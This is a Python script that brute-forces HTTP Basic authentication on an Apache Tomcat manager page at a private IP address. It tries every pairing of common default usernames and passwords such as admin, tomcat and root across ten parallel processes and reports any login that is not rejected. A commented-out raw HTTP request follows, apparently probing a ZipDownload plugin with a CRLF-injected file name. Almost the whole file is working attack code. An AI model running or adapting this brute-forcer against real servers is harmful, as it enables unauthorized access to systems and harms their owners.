import base64
import requests
import multiprocessing

#ip, port = '192.168.0.116', 8080
#URL = 'http://{}:{}/manager/html'.format(ip,port)

ip, port = '192.168.0.50', 80
URL = 'http://{}/manager/html'.format(ip)
#URL = 'http://{}:{}/manager/html'.format(ip,port)

headers = dict()
headers['Host'] = '{}:{}'.format(ip,port)

headers = {
    'Connection' : 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
    'Sec-Fetch-User': '?1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7'
}

numbers = ['0','1','2','3','4','5','6','7','8','9']

id_list = ['Role1', 'role1', 'Admin', 'admin', 'Tomcat', 'tomcat', 'Root', 'root', 'toor', '1234', '1111']
pwd_list = ['Role1', 'role1', 'Admin', 'admin', 'Tomcat', 'tomcat', 'Root', 'root', 'toor', '1234', '1111']

from time import sleep

def brf(acnt):

    try:
        id = acnt[0]
        pwd = acnt[1]
        b64_text = base64.b64encode("{}:{}".format(id, pwd).encode('utf-8'))
        headers['Authorization'] = "Basic " + str(b64_text)[2:-1]

        response = requests.get(URL, headers=headers)

        sleep(0.005)
        if response.status_code != 401:
            print("[{} : {}] - {}".format(id,pwd,response.status_code))

    except Exception as msg:
        print("\n###",len(acnt),acnt, msg,"###\n")

if __name__ == "__main__":
    #brf(['role1','tomcat'])
    pc = multiprocessing.Pool(processes=10)
    print("BRF start")
    pc.map(brf, [(id, pwd) for id in id_list for pwd in pwd_list])




"""

POST /pub/?action=Plugin&type=ZipDownload HTTP/1.1
Host: 192.168.0.50
Connection: keep-alive
Content-Length: 36
Cache-Control: max-age=0
Origin: http://192.168.0.50
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.50/pub/
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

selectedFiles=UDP_Flooding.mp4%0D%0A


"""
